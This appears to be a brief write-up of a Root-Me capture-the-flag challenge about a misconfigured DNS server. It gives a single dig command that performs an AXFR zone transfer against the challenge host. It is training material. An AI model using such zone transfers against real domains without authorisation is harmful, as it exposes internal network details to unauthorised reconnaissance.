# Description 
```
A careless administrator set up a DNS service for the domain "ch11.challenge01.root-me.org"...
Connection parameters for the challenge:

Host        challenge01.root-me.org
Protocol    DNS
Port        54011
```
# Exploit
- It is possible to perform a zone transfer using dig::
```
dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org.
```